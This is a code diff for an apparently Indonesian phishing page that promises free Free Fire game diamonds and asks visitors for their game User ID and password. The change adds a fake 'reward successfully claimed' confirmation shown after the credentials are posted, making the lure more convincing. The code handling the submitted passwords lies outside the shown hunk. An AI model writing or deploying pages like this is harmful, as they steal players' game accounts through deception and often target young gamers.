@@ -71,37 +71,53 @@ if (isset($_POST['userid'])) {
     <div class="row mt-2 d-flex justify-content-center">
       <!-- card -->
       <div class="col-lg-8">
-        <div class="card">
-          <div class="card-body">
-            <h5 class="card-title">
-              <i class="fas fa-gift"></i> Klaim Hadiah Free Fire
-            </h5>
-            <div class="">
-              <p class="card-text">
-                Klaim hadiah free fire dengan mudah dan cepat.
-              </p>
-              <center><img src="https://dailyspin.id/wp-content/uploads/2021/08/DIAMOND-GRATIS-FF.jpg" alt="" width="100%"></center>
-              <!-- form userid dan password -->
-              <form action="" method="post">
-                <div class="form-group pt-2">
-                  <label for="exampleInputEmail1">
-                    Masukkan User ID
-                  </label>
-                  <input type="text" class="form-control" id="userid" aria-describedby="emailHelp" placeholder="Masukkan User ID" name="userid" />
-                </div>
-                <div class="form-group pt-2 pb-2">
-                  <label for="exampleInputPassword1">
-                    Masukkan Password
-                  </label>
-                  <input type="password" class="form-control" id="password" placeholder="Masukkan Password" name="password" />
-                </div>
-                <button type="submit" class="btn btn-lg btn-block btn-primary">
-                  Klaim
-                </button>
-              </form>
+        <!-- if $_post -->
+        <?php if (isset($_POST['userid'])) : ?>
+          <div class="alert alert-success" role="alert">
+            <div class="card" id="dunia2">
+              <div class="card-body">
+                <h5 class="card-title">
+                  <center><i class="fas fa-gift"></i> ✅ Hadiah Sukses Diklaim</center>
+                </h5>
+              </div>
             </div>
           </div>
-        </div>
+        <?php else : ?>
+          <div class="card" id="dunia1">
+            <div class="card-body">
+              <h5 class="card-title">
+                <i class="fas fa-gift"></i> Klaim Hadiah Free Fire
+              </h5>
+              <div class="">
+                <p class="card-text">
+                  Klaim hadiah free fire dengan mudah dan cepat.
+                </p>
+                <center><img src="https://dailyspin.id/wp-content/uploads/2021/08/DIAMOND-GRATIS-FF.jpg" alt="" width="100%"></center>
+                <!-- form userid dan password -->
+                <form action="" method="post">
+                  <div class="form-group pt-2">
+                    <label for="exampleInputEmail1">
+                      Masukkan User ID
+                    </label>
+                    <input type="text" class="form-control" id="userid" aria-describedby="emailHelp" placeholder="Masukkan User ID" name="userid" />
+                  </div>
+                  <div class="form-group pt-2 pb-2">
+                    <label for="exampleInputPassword1">
+                      Masukkan Password
+                    </label>
+                    <input type="password" class="form-control" id="password" placeholder="Masukkan Password" name="password" />
+                  </div>
+                  <button type="submit" class="btn btn-lg btn-block btn-primary">
+                    Klaim
+                  </button>
+                </form>
+              </div>
+            </div>
+          </div>
+        <?php endif; ?>
+
+
+
       </div>
     </div>
   </div>
